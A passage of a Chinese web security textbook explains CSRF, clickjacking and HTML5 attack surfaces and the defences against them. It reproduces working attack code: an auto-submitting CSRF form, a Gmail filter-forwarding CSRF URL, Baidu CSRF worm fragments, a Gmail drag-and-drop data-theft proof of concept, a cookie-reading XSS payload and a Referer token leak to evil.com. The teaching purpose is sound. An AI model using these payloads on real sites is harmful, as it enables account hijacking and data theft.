从攻击过程来说，反射型XSS，一般要求攻击者诱使用户点击一个包含XSS代码的URL链接；而存储型XSS，则只需要让用户查看一个正常的URL链接。比如一个Web邮箱的邮件正文页面存在一个存储型的XSS漏洞，当用户打开一封新邮件时，XSS Payload会被执行。这样的漏洞极其隐蔽，且埋伏在用户的正常业务中，风险颇高



从风险的角度看，用户之间有互动的页面，是可能发起XSS Worm攻击的地方。而根据不同页面的PageView高低，也可以分析出哪些页面受XSS攻击后的影响会更大。比如在网站首页发生的XSS攻击，肯定比网站合作伙伴页面的XSS攻击要严重得多。
在修补XSS漏洞时遇到的最大挑战之一是漏洞数量太多，因此开发者可能来不及，也不愿意修补这些漏洞。从业务风险的角度来重新定位每个XSS漏洞，就具有了重要的意义。


<hr />
### 3.4 小结



理论上，XSS漏洞虽然复杂，但却是可以彻底解决的。在设计XSS解决方案时，应该深入理解XSS攻击的原理，针对不同的场景使用不同的方法。同时有很多开源项目为我们提供了参考。




<hr />
### 第4章　跨站点请求伪造（CSRF）



CSRF的全名是Cross Site Request Forgery，翻译成中文就是跨站点请求伪造。
它是一种常见的Web攻击，但很多开发者对它很陌生。CSRF也是Web安全中最容易被忽略的一种攻击方式，甚至很多安全工程师都不太理解它的利用条件与危害，因此不予重视。但CSRF在某些时候却能够产生强大的破坏性。


<hr />
### 4.2.1 浏览器的Cookie策略



浏览器所持有的Cookie分为两种：一种是“Session Cookie”，又称“临时Cookie”；另一种是“Third-party Cookie”，也称为“本地Cookie”。
两者的区别在于，Third-party Cookie是服务器在Set-Cookie时指定了Expire时间，只有到了Expire时间后Cookie才会失效，所以这种Cookie会保存在本地；而Session Cookie则没有指定Expire时间，所以浏览器关闭后，Session Cookie就失效了。



在浏览网站的过程中，若是一个网站设置了Session Cookie，那么在浏览器进程的生命周期内，即使浏览器新打开了Tab页，Session Cookie也都是有效的。Session Cookie保存在浏览器进程的内存空间中；而Third-party Cookie则保存在本地。
如果浏览器从一个域的页面中，要加载另一个域的资源，由于安全原因，某些浏览器会阻止Third-party Cookie的发送。



这时再打开一个新的浏览器Tab页，访问同一个域中的不同页面。因为新Tab页在同一个浏览器进程中，因此Session Cookie将被发送。



此时在另外一个域中，有一个页面` http://www.b.com/csrf-test.html`，此页面构造了CSRF以访问www.a.com。

```
<iframe src="http://www.a.com" ></iframe>
```

这时却会发现，只能发送出Session Cookie，而Third-party Cookie被禁止了。
只发送了Session Cookie
这是因为IE出于安全考虑，默认禁止了浏览器在<img>、<iframe>、<script>、<link>等标签中发送第三方Cookie。
再回过头来看看Firefox的行为。在Firefox中，默认策略是允许发送第三方Cookie的。



由此可见，在本章一开始所举的CSRF攻击案例中，因为用户的浏览器是Firefox，所以能够成功发送用于认证的Third-party Cookie，最终导致CSRF攻击成功。
而对于IE浏览器，攻击者则需要精心构造攻击环境，比如诱使用户在当前浏览器中先访问目标站点，使得Session Cookie有效，再实施CSRF攻击。



在当前的主流浏览器中，默认会拦截Third-party Cookie的有：IE 6、IE 7、IE 8、Safari；不会拦截的有：Firefox 2、Firefox 3、Opera、Google Chrome、Android等。
但若CSRF攻击的目标并不需要使用Cookie，则也不必顾虑浏览器的Cookie策略了。


<hr />
### 4.2.2 P3P头的副作用



P3P Header是W3C制定的一项关于隐私的标准，全称是The Platform for Privacy Preferences。
如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。在IE下即使是<iframe>、<script>等标签也将不再拦截第三方Cookie的发送。
在网站的业务中，P3P头主要用于类似广告等需要跨域访问的页面。但是很遗憾的是，P3P头设置后，对于Cookie的影响将扩大到整个域中的所有页面，因为Cookie是以域和path为单位的，这并不符合“最小权限”原则。



正因为P3P头目前在网站的应用中被广泛应用，因此在CSRF的防御中不能依赖于浏览器对第三方Cookie的拦截策略，不能心存侥幸。
很多时候，如果测试CSRF时发现<iframe>等标签在IE中居然能发送Cookie，而又找不到原因，那么很可能就是因为P3P头在作怪。


<hr />
### 4.2.3 GET? POST?



在CSRF攻击流行之初，曾经有一种错误的观点，认为CSRF攻击只能由GET请求发起。因此很多开发者都认为只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。
这种错误的观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是<img>、<iframe>、<script>等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。而对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是`$_REQUEST，而非$_POST获取变量，则会存在这个问题。`



若服务器端未对请求方法进行限制，则这个请求会通过。
如果服务器端已经区分了GET与POST，那么攻击者有什么方法呢？对于攻击者来说，有若干种方法可以构造出一个POST请求。
最简单的方法，就是在一个页面中构造好一个form表单，然后使用JavaScript自动提交这个表单。比如，攻击者在www.b.com/test.html中编写如下代码：

```
<form action="http://www.a.com/register" id="register" method="post" >
<input type=text name="username" value="" />
<input type=password name="password" value="" />
<input type=submit name="submit" value="submit" />
</form>
<script>
var f = document.getElementById("register");
f.inputs[0].value = "test";
f.inputs[1].value = "passwd";
f.submit();
</script>

```

攻击者甚至可以将这个页面隐藏在一个不可见的iframe窗口中，那么整个自动提交表单的过程，对于用户来说也是不可见的。



在2007年的Gmail CSRF漏洞攻击过程中，安全研究者pdp展示了这一技巧。



首先，用户需要登录Gmail账户，以便让浏览器获得Gmail的临时Cookie。
用户登录Gmail

然后，攻击者诱使用户访问一个恶意页面。攻击者诱使用户访问恶意页面
在这个恶意页面中，隐藏了一个iframe，iframe的地址指向pdp写的CSRF构造页面。

```
http://www.gnucitizen.org/util/csrf?_method=POST&_enctype=multipart/form-data&_action
=https%3A//mail.google.com/mail/h/ewt1jmuj4ddv/%3Fv%3Dprf&cf2_emc=true&cf2_email=evil
inbox@mailinator.com&cf1_from&cf1_to&cf1_subj&cf1_has&cf1_hasnot&cf1_attach=true&tfi&
s=z&irf=on&nvp_bu_cftb=Create%20Filter

```

这个链接的实际作用就是把参数生成一个POST的表单，并自动提交。
由于浏览器中已经存在Gmail的临时Cookie，所以用户在iframe中对Gmail发起的这次请求会成功——邮箱的Filter中会新创建一条规则，将所有带附件的邮件都转发到攻击者的邮箱中。
恶意站点通过CSRF在用户的Gmail中建立一条规则


<hr />
### 4.2.4 Flash CSRF



Flash也有多种方式能够发起网络请求，包括POST。比如下面这段代码：


```
import flash.net.URLRequest;
import flash.system.Security;
var url = new URLRequest("http://target/page");
var param = new URLVariables();
param = "test=123";
url.method = "POST";
url.data = param;
sendToURL(url);
stop();

```

除了URLRequest外，在Flash中还可以使用getURL，loadVars等方式发起请求。比如：


```
req = new LoadVars();
req.addRequestHeader("foo", "bar");
req.send("http://target/page?v1=123&v2=456", "_blank", "GET");

```

在IE 6、IE 7中，Flash发送的网络请求均可以带上本地Cookie；但是从IE 8起，Flash发起的网络请求已经不再发送本地Cookie了。



<hr />
### 4.2.5 CSRF Worm



CSRF Worm

2008年9月，国内的安全组织80sec公布了一个百度的CSRF Worm。
漏洞出现在百度用户中心的发送短消息功能中：


```
http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn=用户账户&co=消息内容

```

只需要修改参数sn，即可对指定的用户发送短消息。而百度的另外一个接口则能查询出某个用户的所有好友：


```
http://frd.baidu.com/?ct=28&un=用户账户&cm=FriList&tn=bmABCFriList&callback=gotfriends

```

将两者结合起来，可以组成一个CSRF Worm——让一个百度用户查看恶意页面后，将给他的所有好友发送一条短消息，然后这条短消息中又包含一张图片，其地址再次指向CSRF页面，使得这些好友再次将消息发给他们的好友，这个Worm因此得以传播。


```
Step 1：模拟服务器端取得request的参数。
var lsURL=window.location.href;
loU = lsURL.split("?");
if (loU.length>1)
{
var loallPm = loU[1].split("&");

```

定义蠕虫页面服务器地址，取得?和&符号后的字符串，从URL中提取感染蠕虫的用户名和感染者的好友用户名。

Step 2：好友json数据的动态获取。


```
var gotfriends = function (x)
{
  for(i=0;i<x[2].length;i++)
  {
  friends.push(x[2][i][1]);
  }
}
loadjson('<script
src="http://frd.baidu.com/?ct=28&un='+lusername+'&cm=FriList&tn=bmABCFriList&callback
=gotfriends&.tmp=&1=2"><\/script>');

```

通过CSRF漏洞从远程加载受害者的好友json数据，根据该接口的json数据格式，提取好友数据为蠕虫的传播流程做准备。


Step 3：感染信息输出和消息发送的核心部分。


```
evilurl=url+"/wish.php?from="+lusername+"&to=";
sendmsg="http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn=[user]&co=[evilmsg]"
for(i=0;i<friends.length;i++){
mysendmsg=mysendmsg+"&"+i;
eval('x'+i+'=new Image();x'+i+'.src=unescape(""+mysendmsg+'");');


```

将感染者的用户名和需要传播的好友用户名放到蠕虫链接内，然后输出短消息。

这个蠕虫很好地展示了CSRF的破坏性——即使没有XSS漏洞，仅仅依靠CSRF，也是能够发起大规模蠕虫攻击的。


<hr />
### 4.3.1 验证码




### CSRF的防御


<hr />
### 4.3.1　验证码
验证码被认为是对抗CSRF攻击最简洁而有效的防御方法。
CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。



但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。

<hr />
### 4.3.2 Referer Check



Referer Check在互联网中最常见的应用就是“防止图片盗链”。同理，Referer Check也可以被用于检查请求是否来自合法的“源”。
常见的互联网应用，页面与页面之间都具有一定的逻辑关系，这就使得每个正常请求的Referer具有一定的规律。



比如一个“论坛发帖”的操作，在正常情况下需要先登录到用户后台，或者访问有发帖功能的页面。在提交“发帖”的表单时，Referer的值必然是发帖表单所在的页面。如果Referer的值不是这个页面，甚至不是发帖网站的域，则极有可能是CSRF攻击。



即使我们能够通过检查Referer是否合法来判断用户是否被CSRF攻击，也仅仅是满足了防御的充分条件。Referer Check的缺陷在于，服务器并非什么时候都能取到Referer。很多用户出于隐私保护的考虑，限制了Referer的发送。在某些情况下，浏览器也不会发送Referer，比如从HTTPS跳转到HTTP，出于安全的考虑，浏览器也不会发送Referer。



出于以上种种原因，我们还是无法依赖于Referer Check作为防御CSRF的主要手段。但是通过Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。


<hr />
### 4.3.3 Anti CSRF Token



Anti CSRF Token

现在业界针对CSRF的防御，一致的做法是使用一个Token



CSRF的本质

CSRF为什么能够攻击成功？其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。
攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求；反之，攻击者将无法攻击成功。



出于这个原因，可以想到一个解决方案：把参数加密，或者使用一些随机数，从而让攻击者无法猜测到参数值。这是“不可预测性原则”的一种应用（参考“我的安全世界观”一章）。
比如，一个删除操作的URL是：


```
http://host/path/delete?username=abc&item=123
```

把其中的username参数改成哈希值：


```
http://host/path/delete?username=md5(salt+abc)&item=123


```

这样，在攻击者不知道salt的情况下，是无法构造出这个URL的，因此也就无从发起CSRF攻击了。而对于服务器来说，则可以从Session或Cookie中取得“username=abc”的值，再结合salt对整个请求进行验证，正常请求会被认为是合法的。



但是这个方法也存在一些问题。首先，加密或混淆后的URL将变得非常难读，对用户非常不友好。其次，如果加密的参数每次都改变，则某些URL将无法再被用户收藏。最后，普通的参数如果也被加密或哈希，将会给数据分析工作带来很大的困扰，因为数据分析工作常常需要用到参数的明文。



因此，我们需要一个更加通用的解决方案来帮助解决这个问题。这个方案就是使用Anti CSRF Token。



回到上面的URL中，保持原参数不变，新增一个参数Token。这个Token的值是随机的，不可预测：

```
http://host/path/delete?username=abc&item=123&token=[random(seed)]

```

Token需要足够随机，必须使用足够安全的随机数生成算法，或者采用真随机数生成器（物理随机，请参考“加密算法与随机数”一章）。Token应该作为一个“秘密”，为用户与服务器所共同持有，不能被第三者知晓。在实际应用时，Token可以放在用户的Session中，或者浏览器的Cookie中。
由于Token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。



Token需要同时放在表单和Session中。在提交请求时，服务器只需验证表单中的Token，与用户Session（或Cookie）中的Token是否一致，如果一致，则认为是合法请求；如果不一致，或者有一个为空，则认为请求不合法，可能发生了CSRF攻击。



如下这个表单中，Token作为一个隐藏的input字段，放在form中：隐藏字段中的Token
同时Cookie中也包含了一个Token：Cookie中的Token



Anti CSRF Token在使用时，有若干注意事项。

防御CSRF的Token，是根据“不可预测性原则”设计的方案，所以Token的生成一定要足够随机，需要使用安全的随机数生成器生成Token。
此外，这个Token的目的不是为了防止重复提交。所以为了使用方便，可以允许在一个用户的有效生命周期内，在Token消耗掉前都使用同一个Token。但是如果用户已经提交了表单，则这个Token已经消耗掉，应该再次重新生成一个新的Token。
如果Token保存在Cookie中，而不是服务器端的Session中，则会带来一个新的问题。如果一个用户打开几个相同的页面同时操作，当某个页面消耗掉Token后，其他页面的表单内保存的还是被消耗掉的那个Token，因此其他页面的表单再次提交时，会出现Token错误。在这种情况下，可以考虑生成多个有效的Token，以解决多页面共存的场景。
最后，使用Token时应该注意Token的保密性。Token如果出现在某个页面的URL中，则可能会通过Referer的方式泄露。比如以下页面：
http://host/path/manage?username=abc&token=[random]
这个manage页面是一个用户面板，用户需要在这个页面提交表单或者单击“删除”按钮，才能完成删除操作。
在这种场景下，如果这个页面包含了一张攻击者能指定地址的图片：

```
<img src="http://evil.com/notexist" />
则“http://host/path/manage?username=abc&token=[random]”会作为HTTP请求的Referer发送到evil.com的服务器上，从而导致Token泄露。
```


因此在使用Token时，应该尽量把Token放在表单中。把敏感操作由GET改为POST，以form表单（或者AJAX）的形式提交，可以避免Token泄露。
此外，还有一些其他的途径可能导致Token泄露。比如XSS漏洞或者一些跨域漏洞，都可能让攻击者窃取到Token的值。
CSRF的Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会变得无效，因为XSS可以模拟客户端浏览器执行任意操作。在XSS攻击下，攻击者完全可以请求页面后，读出页面内容里的Token值，然后再构造出一个合法的请求。这个过程可以称之为XSRF，和CSRF以示区分。



XSS带来的问题，应该使用XSS的防御方案予以解决，否则CSRF的Token防御就是空中楼阁。安全防御的体系是相辅相成、缺一不可的。


<hr />
### 4.4 小结



本章介绍了Web安全中的一个重要威胁：CSRF攻击。CSRF攻击也能够造成严重的后果，不能忽略或轻视这种攻击方式。
CSRF攻击是攻击者利用用户的身份操作用户账户的一种攻击方式。设计CSRF的防御方案必须先理解CSRF攻击的原理和本质。
根据“不可预测性原则”，我们通常使用Anti CSRF Token来防御CSRF攻击。在使用Token时，要注意Token的保密性和随机性。


<hr />
### 第5章　点击劫持（ClickJacking）



2008年，安全专家Robert Hansen与 Jeremiah Grossman发现了一种被他们称为“ClickJacking”（点击劫持）的攻击，这种攻击方式影响了几乎所有的桌面平台，包括IE、Safari、Firefox、Opera以及Adobe Flash。两位发现者准备在当年的OWASP安全大会上公布并进行演示，但包括Adobe在内的所有厂商，都要求在漏洞修补前不要公开此问题。


<hr />
### 5.1 什么是点击劫持



什么是点击劫持
点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。



点击劫持攻击与CSRF攻击（详见“跨站点请求伪造”一章）有异曲同工之妙，都是在用户不知情的情况下诱使用户完成一些动作。但是在CSRF攻击的过程中，如果出现用户交互的页面，则攻击可能会无法顺利完成。与之相反的是，点击劫持没有这个顾虑，它利用的就是与用户产生交互的页面。



twitter也曾经遭受过“点击劫持攻击”。安全研究者演示了一个在别人不知情的情况下发送一条twitter消息的POC，其代码与上例中类似，但是POC中的iframe地址指向了：


```
<iframe scrolling="no" src="http://twitter.com/home?status=Yes, I did click the button!!!
(WHAT!!??)"></iframe>

```


在twitter的URL里通过status参数来控制要发送的内容。攻击者调整页面，使得Tweet按钮被点击劫持。当用户在测试页面点击一个可见的button时，实际上却在不经意间发送了一条微博。


<hr />
### 5.2 Flash点击劫持



下面来看一个更为严重的ClickJacking攻击案例。攻击者通过Flash构造出了点击劫持，在完成一系列复杂的动作后，最终控制了用户电脑的摄像头。



攻击者制作了一个Flash游戏，并诱使用户来玩这个游戏。这个游戏就是让用户去点击“CLICK”按钮，每次点击后这个按钮的位置都会发生变化。演示点击劫持的Flash游戏
在其上隐藏了一个看不见的iframe：Flash上隐藏的iframe窗口
游戏中的某些点击是有意义的，某些点击是无效的。攻击通过诱导用户鼠标点击的位置，能够完成一些较为复杂的流程。某些点击是无意义的
某些点击是无意义的
最终通过这一步步的操作，打开了用户的摄像头。


<hr />
### 5.3 图片覆盖攻击



图片覆盖攻击
点击劫持的本质是一种视觉欺骗。顺着这个思路，还有一些攻击方法也可以起到类似的作用，比如图片覆盖。
一名叫sven.vetsch的安全研究者最先提出了这种Cross Site Image Overlaying攻击，简称XSIO。sven.vetsch通过调整图片的style使得图片能够覆盖在他所指定的任意位置。


```
<a href="http://disenchant.ch">
<img src=http://disenchant.ch/powered.jpg
style=position:absolute;right:320px;top:90px;/>
</a>

```

如下所示，覆盖前的页面是：


覆盖前的页面
覆盖后的页面变成：
覆盖后的页面
页面里的logo图片被覆盖了，并指向了sven.vetsch的网站。如果用户此时再去点击logo图片，则会被链接到sven.vetsch的网站。如果这是一个钓鱼网站的话，用户很可能会上当。
XSIO不同于XSS，它利用的是图片的style，或者能够控制CSS。如果应用没有限制style的position为absolute的话，图片就可以覆盖到页面上的任意位置，形成点击劫持。
百度空间也曾经出现过这个问题，构造代码如下：

```
</table><a href="http://www.ph4nt0m.org">
<img src="http://img.baidu.com/hi/img/portraitn.jpg"
style="position:absolute;left:123px;top:123px;">
</a>
```

一张头像图片被覆盖到logo处：一张头像图片被覆盖到Logo处
点击此图片的话，会被链接到其他网站。
图片还可以伪装得像一个正常的链接、按钮；或者在图片中构造一些文字，覆盖在关键的位置，就有可能完全改变页面中想表达的意思，在这种情况下，不需要用户点击，也能达到欺骗的目的。
比如，利用XSIO修改页面中的联系电话，可能会导致很多用户上当。
由于<img>标签在很多系统中是对用户开放的，因此在现实中有非常多的站点存在被XSIO攻击的可能。在防御XSIO时，需要检查用户提交的HTML代码中，<img>标签的style属性是否可能导致浮出。



<hr />
### 5.4 拖拽劫持与数据窃取



拖拽劫持与数据窃取
2010年，ClickJacking技术有了新的发展。一位名叫Paul Stone的安全研究者在BlackHat 2010大会上发表了题为“Next Generation Clickjacking”的演讲。在该演讲中，提出了“浏览器拖拽事件”导致的一些安全问题。
目前很多浏览器都开始支持Drag & Drop 的API。对于用户来说，拖拽使他们的操作更加简单。浏览器中的拖拽对象可以是一个链接，也可以是一段文字，还可以从一个窗口拖拽到另外一个窗口，因此拖拽是不受同源策略限制的。
“拖拽劫持”的思路是诱使用户从隐藏的不可见iframe中“拖拽”出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。



在JavaScript或者Java API的支持下，这个攻击过程会变得非常隐蔽。因为它突破了传统ClickJacking一些先天的局限，所以这种新型的“拖拽劫持”能够造成更大的破坏。



国内的安全研究者xisigr曾经构造了一个针对Gmail的POC，其过程大致如下。首先，制作一个网页小游戏，要把小球拖拽到小海豹的头顶上。
演示拖拽劫持的网页小游戏
实际上，在小球和小海豹的头顶上都有隐藏的iframe。
在这个例子中，xisigr使用event.dataTransfer.getData('Text')来获取“drag”到的数据。当用户拖拽小球时，实际上是选中了隐藏的iframe里的数据；在放下小球时，把数据也放在了隐藏的textarea中，从而完成一次数据窃取的过程。原理示意图
这个例子的源代码如下：


```
<html>

  <head>
    <title>
      Gmail Clickjacking with drag and drop Attack Demo
    </title>
    <style>
      .iframe_hidden{height: 50px; width: 50px; top:360px; left:365px; overflow:hidden;
      filter: alpha(opacity=0); opacity:.0; position: absolute; } .text_area_hidden{
      height: 30px; width: 30px; top:160px; left:670px; overflow:hidden; filter:
      alpha(opacity=0); opacity:.0; position: absolute; } .ball{ top:350px; left:350px;
      position: absolute; } .ball_1{ top:136px; left:640px; filter: alpha(opacity=0);
      opacity:.0; position: absolute; }.Dolphin{ top:150px; left:600px; position:
      absolute; }.center{ margin-right: auto;margin-left: auto;
vertical-align:middle;text-align:center;
      margin-top:350px;}
    </style>
    <script>
      function Init() {
        var source = document.getElementById("source");
        var target = document.getElementById("target");
        if (source.addEventListener) {
          target.addEventListener("drop", DumpInfo, false);
        } else {
          target.attachEvent("ondrop", DumpInfo);
        }
      }
      function DumpInfo(event) {
        showHide_ball.call(this);
        showHide_ball_1.call(this);
        var info = document.getElementById("info");
        info.innerHTML += "<span style='color:#3355cc;font-size:13px'>" +
event.dataTransfer.getData('Text') + "</span><br> ";
      }
      function showHide_frame() {
        var iframe_1 = document.getElementById("iframe_1");
        iframe_1.style.opacity = this.checked ? "0.5": "0";
        iframe_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=" +
(this.checked ? "50": "0") + ");"
      }
      function showHide_text() {
        var text_1 = document.getElementById("target");
        text_1.style.opacity = this.checked ? "0.5": "0";
        text_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=" +
(this.checked ? "50": "0") + ");"
      }
      function showHide_ball() {
        var hide_ball = document.getElementById("hide_ball");
        hide_ball.style.opacity = "0";
        hide_ball.style.filter = "alpha(opacity=0)";
      }
      function showHide_ball_1() {
        var hide_ball_1 = document.getElementById("hide_ball_1");
        hide_ball_1.style.opacity = "1";
        hide_ball_1.style.filter = "alpha(opacity=100)";
      }
      function reload_text() {
        document.getElementById("target").value = '';
      }
    </script>
  </head>

  <body onload="Init();">
    <center>
      <h1>
        Gmail Clickjacking with drag and drop Attack
      </h1>
    </center>
    <img id="hide_ball" src=ball.png class="ball">
    <div id="source">
      <iframe id="iframe_1" src="https://mail.google.com/mail/ig/mailmax"
class="iframe_hidden"
      scrolling="no">
      </iframe>
    </div>
    <img src=Dolphin.jpg class="Dolphin">
    <div>
      <img id="hide_ball_1" src=ball.png class="ball_1">
    </div>
    <div>
      <textarea id="target" class="text_area_hidden">
      </textarea>
    </div>
    <div id="info" style="position:absolute;background-color:#e0e0e0;font-weight:bold;
top:600px;">
    </div>
    <center>
      Note: Clicking "ctrl + a" to select the ball, then drag it to the
      <br>
      mouth of the dolphin with the mouse.Make sure you have logged into GMAIL.
      <br>
    </center>
    <br>
    <br>
    <div class="center">
      <center>
        <center>
          <input id="showHide_frame" type="checkbox"
onclick="showHide_frame.call(this);"
          />
          <label for="showHide_frame">
            Show the jacked I--Frame
          </label>
          |
          <input id="showHide_text" type="checkbox" onclick="showHide_text.call(this);"
          />
          <label for="showHide_text">
            Show the jacked Textarea
          </label>
          |
          <input type=button value="Replay" onclick="location.reload();reload_text();">
        </center>
        <br><br>
        <b>
          Design by
          <a target="_blank" href="http://hi.baidu.com/xisigr">
            xisigr
          </a>
        </b>
      </center>
    </div>
  </body>

</html>

```

这是一个非常精彩的案例。



<hr />
### 5.5 ClickJacking 3.0：触屏劫持



到了2010年9月，智能手机上的“触屏劫持”攻击被斯坦福的安全研究者公布，这意味着ClickJacking的攻击方式更进一步。安全研究者将这种触屏劫持称为TapJacking。
以苹果公司的iPhone为代表，智能手机为人们提供了更先进的操控方式：触屏。从手机OS的角度来看，触屏实际上就是一个事件，手机OS捕捉这些事件，并执行相应的动作。
比如一次触屏操作，可能会对应以下几个事件：
touchstart，手指触摸屏幕时发生；
touchend，手指离开屏幕时发生；
touchmove，手指滑动时发生；
touchcancel，系统可取消touch事件。
通过将一个不可见的iframe覆盖到当前网页上，可以劫持用户的触屏操作。



而手机上的屏幕范围有限，手机浏览器为了节约空间，甚至隐藏了地址栏，因此手机上的视觉欺骗可能会变得更加容易实施。比如下面这个例子：手机屏幕的视觉欺骗
左边的图片，最上方显示了浏览器地址栏，同时攻击者在页面中画出了一个假的地址栏；
中间的图片，真实的浏览器地址栏已经自动隐藏了，此时页面中只剩下假的地址栏；
右边的图片，是浏览器地址栏被正常隐藏的情况。
这种针对视觉效果的攻击可以被利用进行钓鱼和欺诈。
2010年12月，研究者发现在Android系统中实施TapJacking甚至可以修改系统的安全设置，并同时给出了演示。
在未来，随着移动设备中浏览器功能的丰富，也许我们会看到更多TapJacking的攻击方式。




<hr />
### 5.6 防御ClickJacking



```
防御ClickJacking
```


针对传统的ClickJacking，一般是通过禁止跨域的iframe来防范。


<hr />
### 5.6.1 frame busting



frame busting


通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫frame busting。比如下面这段代码：

```
if ( top.location != location ) {
    top.location = self.location;
}
```

常见的frame busting有以下这些方式：


```
if (top != self)
if (top.location != self.location)
if (top.location != location)
if (parent.frames.length > 0)
if (window != top)
if (window.top !== window.self)
if (window.self != window.top)
if (parent && parent != window)
if (parent && parent.frames && parent.frames.length>0)
if((self.parent&&!(self.parent===self))&&(self.parent.frames.length!=0))
top.location = self.location
top.location.href = document.location.href
top.location.href = self.location.href
top.location.replace(self.location)
top.location.href = window.location.href
top.location.replace(document.location)
top.location.href = window.location.href
top.location.href = "URL"
document.write('')
top.location = location
top.location.replace(document.location)
top.location.replace('URL')
top.location.href = document.location
top.location.replace(window.location.href)
top.location.href = location.href
self.parent.location = document.location
parent.location.href = self.document.location
top.location.href = self.location
top.location = window.location
top.location.replace(window.location.pathname)
window.top.location = window.self.location
setTimeout(function(){document.body.innerHTML='';},1);
window.self.onload = function(evt){document.body.innerHTML='';}
var url = window.location.href; top.location.replace(url)

```



但是frame busting也存在一些缺陷。由于它是用JavaScript写的，控制能力并不是特别强，因此有许多方法可以绕过它。
比如针对parent.location的frame busting，就可以采用嵌套多个iframe的方法绕过。假设frame busting代码如下：


```
if ( top.location != self.location) {
   parent.location = self.location ;
}


```


那么通过以下方式即可绕过上面的保护代码：


```
Attacker top frame:
<iframe src="attacker2 .html">
Attacker sub-frame:
<iframe src="http://www.victim.com">
```

此外，像HTML 5中iframe的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的JavaScript脚本执行，从而可以使得frame busting失效。
斯坦福的Gustav Rydstedt等人总结了一篇关于“攻击frame busting”的paper：“Busting frame busting: a study of clickjacking vulnerabilities at popular sites”，详细讲述了各种绕过frame busting的方法。


<hr />
### 5.6.2 X-Frame-Options



因为frame busting存在被绕过的可能，所以我们需要寻找其他更好的解决方案。一个比较好的方案是使用一个HTTP头——X-Frame-Options。
X-Frame-Options可以说是为了解决ClickJacking而生的，目前有以下浏览器开始支持X-Frame-Options：

```
IE 8+
Opera 10.50+
Safari 4+
Chrome 4.1.249.1042+
Firefox 3.6.9 (or earlier with NoScript)
```

它有三个可选的值：

```
DENY
SAMEORIGIN
ALLOW-FROM origin
```

当值为DENY时，浏览器会拒绝当前页面加载任何frame页面；若值为SAMEORIGIN，则frame页面的地址只能为同源域名下的页面；若值为ALLOW-FROM，则可以定义允许frame加载的页面地址。



除了  `X-Frame-Options`之外，Firefox的`Content Security Policy`以及Firefox的NoScript扩展也能够有效防御ClickJacking，这些方案为我们提供了更多的选择。


<hr />
### 5.7 小结



`ClickJacking`



`ClickJacking`相对于XSS与CSRF来说，因为需要诱使用户与页面产生交互行为，因此实施攻击的成本更高，在网络犯罪中比较少见。但`ClickJacking`在未来仍然有可能被攻击者利用在钓鱼、欺诈和广告作弊等方面，不可不察。



<hr />
### 6.1.1　新标签的XSS



新标签的XSS

HTML 5定义了很多新标签、新事件，这有可能带来新的XSS攻击。
一些XSS Filter如果建立了一个黑名单的话，则可能就不会覆盖到HTML 5新增的标签和功能，从而避免发生XSS。
笔者曾经在百度空间做过一次测试，使用的是HTML 5中新增的<video>标签，这个标签可以在网页中远程加载一段视频。与<video>标签类似的还有<audio>标签，用于远程加载一段音频。测试如下：

```html
<video src="http://tinyvid.tv/file/29d6g90a204i1.ogg"
onloadedmetadata="alert(document.cookie);" ondurationchanged="alert(/XSS2/);"
ontimeupdate="alert(/XSS1/);" tabindex="0">
</video>
```

成功地绕过了百度空间的XSS Filter：
百度空间的XSS
HTML 5中新增的一些标签和属性，使得XSS等Web攻击产生了新的变化，为了总结这些变化，有安全研究者建立了一个HTML5 Security Cheatsheet项目，如下所示：
此项目对研究HTML 5安全有着重要作用。





<hr />
### 6.1.2 iframe的sandbox



iframe的sandbox
<iframe>标签一直以来都为人所诟病。挂马、XSS、ClickJacking等攻击中都能看到它不光彩的身影。浏览器厂商也一直在想办法限制iframe执行脚本的权限，比如跨窗口访问会有限制，以及IE中的<iframe>标签支持security属性限制脚本的执行，都在向着这一目标努力。
在HTML 5中，专门为iframe定义了一个新的属性，叫sandbox。使用sandbox这一个属性后，<iframe>标签加载的内容将被视为一个独立的“源”（源的概念请参考“同源策略”），其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其他浏览对象的链接也会被禁止。
sandbox属性可以通过参数来支持更精确的控制。有以下几个值可以选择：
allow-same-origin：允许同源访问；
allow-top-navigation：允许访问顶层窗口；
allow-forms：允许提交表单；
allow-scripts：允许执行脚本。
可有的行为即便是设置了allow-scripts，也是不允许的，比如“弹出窗口”。
一个iframe的实例如下：
<iframe sandbox="allow-same-origin allow-forms allow-scripts"
        src="http://maps.example.com/embedded.html"></iframe>
毫无疑问，iframe的sandbox属性将极大地增强应用使用iframe的安全性。



<hr />
### 6.1.3 Link Types: noreferrer



Link Types: noreferrer

在HTML 5中为<a>标签和<area>标签定义了一个新的Link Types：noreferrer。
顾名思义，标签指定了noreferrer后，浏览器在请求该标签指定的地址时将不再发送Referer。
<a href="xxx" rel="noreferrer" >test</a>
这种设计是出于保护敏感信息和隐私的考虑。因为通过Referer，可能会泄露一些敏感信息。
